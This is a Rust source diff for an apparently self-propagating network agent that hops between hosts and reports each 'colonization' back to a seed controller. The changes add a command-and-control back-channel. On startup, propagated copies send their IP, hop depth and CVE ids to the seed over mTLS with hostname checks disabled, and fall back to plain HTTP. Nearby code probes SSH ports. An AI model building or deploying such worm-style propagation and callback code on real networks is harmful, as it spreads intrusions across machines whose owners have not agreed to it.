@@ -151,9 +151,14 @@ pub async fn run(mut cli: Cli, sink: Option<std::sync::Arc<GraphSink>>) -> Resul
     });
     let intel = std::sync::Arc::new(intel);
     let mut lineage = init_lineage(&cli)?;
-    // Embed the --server port so propagated hops can call back via HTTP.
+    // Embed ports so propagated hops can call back.
+    // server_port → browser HTTP (legacy /report-colonization fallback)
+    // mtls_port   → mTLS back-channel on server_port + 1 (Issue #189)
     if matches!(cli.mode, Mode::Seed) {
         lineage.server_port = cli.server;
+        if crate::tls_store::STORE.get().is_some() {
+            lineage.mtls_port = cli.server.map(|p| p + 1);
+        }
     }
     lineage.save()?;
 
@@ -198,6 +203,20 @@ pub async fn run(mut cli: Cli, sink: Option<std::sync::Arc<GraphSink>>) -> Resul
         discovery_interval_s = cli.discovery_interval_secs,
         "physarum-maze agent ready — startup sweep on first tick"
     );
+
+    // Propagated agent: report own colonization back to the seed immediately on startup.
+    // The seed never calls fire_back_channel for itself; only propagated agents report.
+    if matches!(cli.mode, Mode::Propagated) {
+        if let Some(my_ip) = local_ip {
+            let report = physarum_protocol::ColonizationReport {
+                hop_ip: my_ip.to_string(),
+                depth: (lineage.hops as u32).saturating_add(1),
+                confidence: 0.9,
+                cve_ids: vec![],
+            };
+            fire_back_channel(report, &lineage).await;
+        }
+    }
 
     loop {
         tokio::select! {
@@ -522,14 +541,62 @@ async fn handle_candidate(
 /// uses the report to update the organism graph with downstream hops it cannot
 /// observe directly (no `GraphSink` on propagated instances).
 ///
-/// The callback URL is fully dynamic: `http://<lineage.origin>:<lineage.server_port>/report-colonization`.
+/// When the lineage carries mTLS fields (Issue #189), the back-channel uses
+/// `https://` with the agent's client cert and trusts only the seed's ephemeral CA.
+/// Falls back to plain `http://` when certs are absent (dev/legacy path).
 /// Failures are logged as warnings and never block the propagation chain.
 async fn fire_back_channel(report: physarum_protocol::ColonizationReport, lineage: &Lineage) {
-    let Some(port) = lineage.server_port else {
-        tracing::debug!("back-channel skipped — no server_port in lineage");
-        return;
+    // Prefer mTLS back-channel (Issue #189): separate port, client cert required.
+    // Fall back to plain HTTP on server_port (legacy path when no mTLS certs in lineage).
+    let (scheme, port, client) = match (
+        lineage.mtls_port,
+        &lineage.ca_cert_pem,
+        &lineage.agent_cert_pem,
+        &lineage.agent_key_pem,
+    ) {
+        (Some(mtls_port), Some(ca_pem), Some(cert_pem), Some(key_pem)) => {
+            let combined = format!("{cert_pem}\n{key_pem}");
+            let identity_res = reqwest::Identity::from_pem(combined.as_bytes());
+            let ca_res = reqwest::Certificate::from_pem(ca_pem.as_bytes());
+            match (identity_res, ca_res) {
+                (Ok(identity), Ok(ca_cert)) => {
+                    let c = reqwest::Client::builder()
+                        .timeout(std::time::Duration::from_secs(5))
+                        .identity(identity)
+                        .add_root_certificate(ca_cert)
+                        // Server cert SAN is "physarum-seed" (DNS); we connect to
+                        // the seed's IP — skip name check while keeping CA validation.
+                        .danger_accept_invalid_hostnames(true)
+                        .build();
+                    match c {
+                        Ok(client) => ("https", mtls_port, client),
+                        Err(e) => {
+                            tracing::warn!(err = %e, "back-channel: mTLS client build failed — skipping");
+                            return;
+                        }
+                    }
+                }
+                _ => {
+                    tracing::warn!("back-channel: PEM parse failed — skipping");
+                    return;
+                }
+            }
+        }
+        _ => {
+            // Legacy plain HTTP fallback (propagated agents without mTLS certs).
+            let Some(port) = lineage.server_port else {
+                tracing::debug!("back-channel skipped — no server_port or mtls_port in lineage");
+                return;
+            };
+            let plain = reqwest::Client::builder()
+                .timeout(std::time::Duration::from_secs(5))
+                .build()
+                .unwrap_or_default();
+            ("http", port, plain)
+        }
     };
-    let url = format!("http://{}:{}/report-colonization", lineage.origin, port);
+
+    let url = format!("{scheme}://{}:{}/report-colonization", lineage.origin, port);
     tracing::info!(
         url = %url,
         hop = %report.hop_ip,
@@ -537,16 +604,7 @@ async fn fire_back_channel(report: physarum_protocol::ColonizationReport, lineag
         confidence = report.confidence,
         "back-channel: reporting colonization to seed"
     );
-    let client = match reqwest::Client::builder()
-        .timeout(std::time::Duration::from_secs(5))
-        .build()
-    {
-        Ok(c) => c,
-        Err(e) => {
-            tracing::warn!(err = %e, "back-channel: reqwest client build failed");
-            return;
-        }
-    };
+
     match client.post(&url).json(&report).send().await {
         Ok(r) if r.status().is_success() => {
             tracing::info!(hop = %report.hop_ip, "back-channel: seed acknowledged");
@@ -596,11 +654,10 @@ fn init_lineage(cli: &Cli) -> Result<Lineage> {
 ///
 /// Seed mode: read from the NIC.
 /// Propagated mode: the last IP in the lineage path is the current host.
-fn resolve_local_ip(cli: &Cli, lineage: &Lineage) -> Option<Ipv4Addr> {
-    match &cli.mode {
-        Mode::Seed | Mode::KeygenTest => local_ip(&cli.interface).ok(),
-        Mode::Propagated => lineage.path.last().and_then(|s| s.parse::<Ipv4Addr>().ok()),
-    }
+fn resolve_local_ip(cli: &Cli, _lineage: &Lineage) -> Option<Ipv4Addr> {
+    // Always read from the network interface — lineage.path.last() is the seed's IP
+    // at propagated-agent startup (path not yet updated with the new host's address).
+    local_ip(&cli.interface).ok()
 }
 
 /// TCP connect probe — confirms port 22 is open and accepting connections.
